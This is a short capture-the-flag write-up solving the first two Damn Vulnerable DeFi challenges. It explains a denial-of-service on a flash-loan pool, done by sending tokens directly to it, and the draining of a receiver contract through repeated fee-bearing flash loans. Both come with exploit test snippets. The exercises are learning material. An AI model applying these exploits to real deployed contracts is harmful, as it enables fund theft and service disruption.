# DamnVulnerableDefi

## Challenge #1 - Unstoppable 

To stop the pool from offering flash loans the assert statement in the flashloan function needs to be exploited. This can be done via sending
tokens to the contract by not using the depositTOken function. This way ```poolBlanace``` will never be equal to ```balanceBefore```.

Add these lines to unstopabble.challenge.js:
```
 it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        await this.token.connect(attacker).transfer(this.pool.address, 1);
    });
```

## Challenge #2 - Naive receiver

To drain all ETH funds from the user's contract , the contract must borrow a flash loan 10 times so that it has to pay a fee of 1ETH everytime.
SInce there's no restriction on the flashLoan function it can be called by anyone. Calling it 10 times does the job.

Add these lines to naive-receiver.challenge.js:
``` 
it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        for (let i = 0; i < 10; i++) {
            await this.pool.connect(attacker).flashLoan(this.receiver.address,0);
        }        
        
    });
```
